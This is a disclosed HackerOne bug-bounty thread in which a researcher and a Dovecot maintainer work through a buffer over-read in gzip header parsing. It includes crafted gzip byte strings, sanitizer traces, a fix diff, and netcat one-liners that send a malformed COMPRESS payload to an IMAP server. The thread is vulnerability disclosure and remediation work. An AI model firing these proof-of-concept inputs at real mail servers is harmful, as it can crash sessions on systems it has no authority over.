{"id":832227,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzIyMjc=","url":"https://hackerone.com/reports/832227","title":"Buffer over-reads in i_stream_zlib_read","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2020-03-26T16:26:29.381Z","submitted_at":"2020-03-26T16:26:29.381Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"catenacyber","url":"/catenacyber","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-04-01T12:43:05.171Z","bug_reporter_agreed_on_going_public_at":"2020-04-01T12:43:05.120Z","team_member_agreed_on_going_public_at":"2020-04-01T09:08:11.727Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This can be reproduced by a sample program using libcompression\n```\nint main(int argc, char *argv[]) {\n    const unsigned char *datadec;\n    size_t sizedec;\n    const uint8_t *data = argv[1];\n    size_t size = strlen(data);\n    struct istream *test_input = test_istream_create_data(data, size);\n    const struct compression_handler *handler = compression_detect_handler(test_input);\n    i_stream_seek(test_input, 0);\n    if (handler != NULL \u0026\u0026 handler-\u003ecreate_istream != NULL) {\n        struct istream *input = handler-\u003ecreate_istream(test_input, TRUE);\n        i_stream_unref(\u0026test_input);\n        i_stream_read_more(input, \u0026datadec, \u0026sizedec);\n        i_stream_unref(\u0026input);\n    }\n    return 0;\n}\n```\n\nwith input being `\\x1f\\x8b\\x01Dovec/\\x01\\xbf`\n\nStack trace is \n```\n==40290==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000001de at pc 0x00010a2dce25 bp 0x7ffee5964f70 sp 0x7ffee5964f68\nREAD of size 1 at 0x6020000001de thread T0\n    #0 0x10a2dce24 in be16_to_cpu_unaligned byteorder.h:179\n    #1 0x10a2dcdae in le16_to_cpu_unaligned byteorder.h:232\n    #2 0x10a2dc80a in i_stream_zlib_read_header istream-zlib.c:107\n    #3 0x10a2dac41 in i_stream_zlib_read istream-zlib.c:221\n    #4 0x10a3061d3 in i_stream_read_memarea istream.c:313\n    #5 0x10a305f1a in i_stream_read istream.c:271\n    #6 0x10a309023 in i_stream_read_data istream.c:745\n    #7 0x10a29bad0 in i_stream_read_more istream.h:224\n    #8 0x10a29b9e9 in LLVMFuzzerTestOneInput fuzz-compression.c:29\n```\n\nPatch is fixing the comparaison direction :\n```\ndiff --git a/src/lib-compression/istream-zlib.c b/src/lib-compression/istream-zlib.c\nindex 3e514cab84..c04df039d8 100644\n--- a/src/lib-compression/istream-zlib.c\n+++ b/src/lib-compression/istream-zlib.c\n@@ -100,12 +100,12 @@ static int i_stream_zlib_read_header(struct istream_private *stream)\n                return -1;\n        }\n        if ((data[3] \u0026 GZ_FLAG_FEXTRA) != 0) {\n-               if (pos + 2 \u003c size)\n+               if (pos + 2 \u003e size)\n                        return 0;\n \n                fextra_size = le16_to_cpu_unaligned(\u0026data[pos]);\n                pos += 2;\n-               if (pos + fextra_size \u003c size)\n+               if (pos + fextra_size \u003e size)\n                        return 0;\n                pos += fextra_size;\n        }\n@@ -122,7 +122,7 @@ static int i_stream_zlib_read_header(struct istream_private *stream)\n                } while (data[pos++] != '\\0');\n        }\n        if ((data[3] \u0026 GZ_FLAG_FHCRC) != 0) {\n-               if (pos + 2 \u003c size)\n+               if (pos + 2 \u003e size)\n                        return 0;\n                pos += 2;\n        }\n```\n\n## Impact\n\nAn attacker could cause a crash if the buffer over reads crosses a memory page boundary, or achieve to extract sensitive information","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":9,"name":"Buffer Over-read"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":9,"voters":["secator","mashoud1122","catenacyber","you_you","g0rbe","herrickb","speedstar82","rkostyn","ronnyth89"],"severity":{"rating":"none","score":0.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":42899,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/dovecot/core","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7450106,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the report. We'll look into it.","automated_response":false,"created_at":"2020-03-26T16:34:28.952Z","updated_at":"2020-03-26T16:34:28.952Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7450118,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can reproduce the buffer overflow locally. We are determining it's impact.","automated_response":false,"created_at":"2020-03-26T16:36:49.091Z","updated_at":"2020-03-26T16:36:49.091Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7450183,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi! To us it seems that this bug can at most flow over 4 bytes, and even then you can only crash your own session. Also this requires compression extension enabled, which is by default disabled. Do you agree with this assessment? ","automated_response":false,"created_at":"2020-03-26T16:45:25.265Z","updated_at":"2020-03-26T16:45:25.265Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7450186,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-03-26T16:45:34.428Z","updated_at":"2020-03-26T16:45:34.428Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7450894,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I agree, except maybe for the fact that it can flow at most over 4 bytes.\n\nWithout the patch about `fextra_size`, we can flow at most 0xFFFF bytes \n\nAn example input is `\\x1f\\x8b\\xff\\xff\\xff\\xff\\xffy\\xff\\xff\\xff\\xf5`\n\nWith this, we get stack trace\n```\n    #0 0x1044e1dad in i_stream_zlib_read_header istream-zlib.c:118\n    #1 0x1044e0241 in i_stream_zlib_read istream-zlib.c:222\n    #2 0x10450b793 in i_stream_read_memarea istream.c:313\n    #3 0x10450b4da in i_stream_read istream.c:271\n    #4 0x10450e5a3 in i_stream_read_data istream.c:745\n    #5 0x1044a1129 in LLVMFuzzerTestOneInput fuzz-compression.c:29\n```\n\nWith this input, we are ok with condition `if ((data[3] \u0026 GZ_FLAG_FEXTRA) != 0)` and skip error test `if (pos + 2 \u003e size)` and are then ok with condition `(data[3] \u0026 GZ_FLAG_FNAME) != 0` ","automated_response":false,"created_at":"2020-03-26T17:57:09.549Z","updated_at":"2020-03-26T17:57:09.549Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7451006,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I did a naive test over IMAP protocol to see if this would yield any results, but at least so far no. \n\n```\n(printf 'a LOGIN testuser pass\\n'; sleep 0.1; printf 'a COMPRESS GZ\\n\\x1f\\x8b\\xff\\xff\\xff\\xff\\xffy\\xff\\xff\\xff\\xf5\\0\\0\\0\\0\\0\\0\\0\\0') | nc localhost 143\n```\n\nLeads into\n\n```\nMar 26 20:04:38 imap(testuser)\u003c29788\u003e\u003caPYB0cWhxs9/AAAB\u003e: Info: Connection closed: zlib.read(\u003cimap client\u003e): missing gz header at 14 (COMPRESS finished 6.301 secs ago) in=14 out=458 deleted=0 expunged=0 trashed=0 hdr_count=0 hdr_bytes=0 body_count=0 body_bytes=0\n```\n\nI also tried with DEFLATE with similar results. Are you able to come up with some PoC that would allow this to be used over the wire?\n\nTo enable COMPRESS you need to add\n\n```\nmail_plugins = imap_zlib\n```\n\nTo your config file\n","automated_response":false,"created_at":"2020-03-26T18:07:05.547Z","updated_at":"2020-03-26T18:07:05.547Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7451008,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-03-26T18:07:13.274Z","updated_at":"2020-03-26T18:07:13.274Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7458842,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"The POC does not seem right as you have to use `deflate` instead of `GZ` to use raw zlib.\n\nCan you try \n```\n(printf 'a LOGIN testuser nopass\\n'; sleep 0.1; printf 'b compress deflate\\n\\x1f\\x8b\\xff\\xff\\xff\\xff\\xffy\\xff\\xff\\xff\\xf5\\0\\0\\0\\0\\0\\0\\0\\0\\0') | nc localhost 143\n```\n\nI get this log\n```\nMar 27 13:55:46 master: Info: Dovecot v2.4.devel (477d45d4b0) starting up for imap (core dumps disabled)\nMar 27 13:55:48 imap-login: Info: Login: user=\u003ctestuser\u003e, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, mpid=22116, secured, session=\u003cohTcntWh6tJ/AAAB\u003e\nMar 27 13:55:48 imap(testuser)\u003c22116\u003e\u003cohTcntWh6tJ/AAAB\u003e: Fatal: master: service(imap): child 22116 killed with signal 6 (core dumps disabled - https://dovecot.org/bugreport.html#coredumps)\nMar 27 13:56:02 master: Warning: Killed with signal 15 (by pid=22122 uid=0 code=unknown 0)\n```\n\nMy config file has\n```\nprotocol imap {\n  mail_plugins = imap_zlib\n}\n```\n\nI did not manage to debug print in compression.c\nI suppose that is executed in some sandboxed process\nHow can I do that ?","automated_response":false,"created_at":"2020-03-27T13:03:16.278Z","updated_at":"2020-03-27T13:03:16.278Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7459481,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Use `i_debug(\"printf style string\", stuff)`.\n\nI was not able to cause anything but \n\n```\nMar 27 16:13:49 imap(testuser)\u003c1296\u003e\u003c3cTVtdah5s9/AAAB\u003e: Info: Connection closed: zlib.read(\u003cimap client\u003e): corrupted data at 19 (compress finished 0.101 secs ago) in=19 out=450 deleted=0 expunged=0 trashed=0 hdr_count=0 hdr_bytes=0 body_count=0 body_bytes=0.\n```\n\nSignal 6 is assert-crash, although not sure what's causing it for you. Is it some asan compiled binary?","automated_response":false,"created_at":"2020-03-27T14:15:52.129Z","updated_at":"2020-03-27T14:15:52.129Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7459484,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-03-27T14:16:00.387Z","updated_at":"2020-03-27T14:16:00.387Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7460182,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"\u003e Is it some asan compiled binary?\n\nYes, it was\n\nI tried regular compilation with use of `i_debug` and I get the overflowing value with your input\n```\n (printf 'a LOGIN testuser nopass\\n'; sleep 0.1; printf 'c compress gz\\n\\x1f\\x8b\\xff\\xff\\xff\\xff\\xffy\\xff\\xff\\xff\\xf5\\0\\0\\0\\0\\0\\0\\0\\0\\0')\n```\n\nHere is the code with my added `i_debug` and its output added as comment\n\n```\n\tif ((data[3] \u0026 GZ_FLAG_FEXTRA) != 0) {\n\t\tif (pos + 2 \u003e size)\n\t\t\treturn 0;\n\n\t\tfextra_size = le16_to_cpu_unaligned(\u0026data[pos]);\n\t\tpos += 2;\n\t\tif (pos + fextra_size \u003c size)\n\t\t\treturn 0;\n\t\tpos += fextra_size;\n//Mar 27 16:29:36 imap(testuser)\u003c28201\u003e\u003cFiXYxNeh0NR/AAAB\u003e: Debug: printf style string lol pos=62987 size=21 114\n        i_debug(\"printf style string lol pos=%d size=%d %d\", pos, size, __LINE__);\n\t}\n\tif ((data[3] \u0026 GZ_FLAG_FNAME) != 0) {\n//Mar 27 16:29:36 imap(testuser)\u003c28201\u003e\u003cFiXYxNeh0NR/AAAB\u003e: Debug: printf style string lol pos=62987 size=21 117\n        i_debug(\"printf style string lol pos=%d %d %d\", pos, size, __LINE__);\n\t\tdo {\n\t\t\tif (pos == size)\n\t\t\t\treturn 0;\n\t\t} while (data[pos++] != '\\0');\n//Mar 27 16:29:36 imap(testuser)\u003c28201\u003e\u003cFiXYxNeh0NR/AAAB\u003e: Debug: printf style string lol pos=62988 size=21 122\n        i_debug(\"printf style string lol pos=%d size=%d %d\", pos, size, __LINE__);\n\t}\n```\n\nSo, we get `pos=62987 ` when  `size=21` and still read `data[pos++]`\nThe fact that it does not crash must come from the fact that there is another buffer used 62987 bytes later in memory... So we could leak some information","automated_response":false,"created_at":"2020-03-27T15:36:35.480Z","updated_at":"2020-03-27T15:36:35.480Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7489214,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looking at the code very carefully, you can see that each of those GZ_FLAG ones consume data that we do not care about. So they are not actually leaked. We might end up reading various random locations for the if, but in the end, we do `i_stream_skip(stream-\u003eparent, pos)` which places the stream squarely past EOF ensuring it will just sit there waiting for more data.\n\nI do fully agree that this is a buffer overflow, but I cannot really see any possible way for this to leak information outside and the only practical use you can do is to crash your own session, turning this into a regular bug.","automated_response":false,"created_at":"2020-03-31T06:44:28.865Z","updated_at":"2020-03-31T06:44:28.865Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7489215,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-03-31T06:44:50.318Z","updated_at":"2020-03-31T06:44:50.318Z","additional_data":{"old_severity":"Medium (5.4)","new_severity":"None (0.0)","old_severity_id":672721,"new_severity_id":676055},"actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7489224,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-03-31T06:46:23.653Z","updated_at":"2020-03-31T06:46:23.653Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"catenacyber","url":"/catenacyber"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7489357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, so should I do a PR ?","automated_response":false,"created_at":"2020-03-31T07:10:01.573Z","updated_at":"2020-03-31T07:10:01.573Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7489387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure, we can look at the PR at least. The final fix might differ from it though, if we find some alternative way of fixing it.","automated_response":false,"created_at":"2020-03-31T07:13:14.422Z","updated_at":"2020-03-31T07:13:14.422Z","actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7489678,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure, let's follow up on https://github.com/dovecot/core/pull/122","automated_response":false,"created_at":"2020-03-31T07:59:24.401Z","updated_at":"2020-03-31T07:59:24.401Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7501996,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-04-01T09:07:28.555Z","updated_at":"2020-04-01T09:07:28.555Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"catenacyber","url":"/catenacyber"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7502011,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-04-01T09:08:11.755Z","updated_at":"2020-04-01T09:08:11.755Z","first_to_agree":true,"actor":{"username":"akituomi","cleared":false,"url":"/akituomi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7504691,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Disclosing","automated_response":false,"created_at":"2020-04-01T12:43:05.141Z","updated_at":"2020-04-01T12:43:05.141Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7504692,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-04-01T12:43:05.195Z","updated_at":"2020-04-01T12:43:05.195Z","actor":{"username":"catenacyber","cleared":false,"url":"/catenacyber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":20930,"category":"team","content":"Due to missing checks in zlib-istream, the GZ algorithm can over-read input buffer when the stream extra information points to wrong memory area. This can lead into crash in imap component. The COMPRESS command is available only after login, making the impact limited.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60216,"username":"akituomi","name":"Aki Tuomi","bio":"","cleared":false,"website":"https://cmouse.fi","location":"","created_at":"2016-03-10T12:17:14.575Z","url":"https://hackerone.com/akituomi","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/060/216/805d230879c8e3757d37eedddaadf9efed0a8094_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}